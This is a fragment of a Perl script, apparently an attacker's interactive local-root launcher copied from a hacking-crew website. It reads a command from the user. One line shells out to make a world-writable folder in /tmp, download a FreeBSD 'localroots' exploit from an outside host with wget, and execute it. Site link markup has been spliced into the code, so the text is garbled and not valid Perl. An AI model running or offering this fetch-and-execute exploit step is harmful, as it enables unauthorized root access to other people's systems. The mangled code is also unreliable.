...
print "\n";
print "\n\n";
print "\t\t For See Commands <a title="See also How Install IRCD" href="http://mc-crew.info/how-install-ircd">type</a> [help] :D\n";
print "\n";
command:;
$command = <STDIN>;
if ($command =~ /help/){
...
system ("cd /tmp;mkdir freebsd;chmod 777 freebsd;cd freebsd;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/freebsd/<a title="See also FeeLCoMz RFI Scanner Bot v5.0" href="http://mc-crew.info/feelcomz-rfi-scanner-bot-v5-0">exploit</a>;chmod 777 exploit;./exploit");
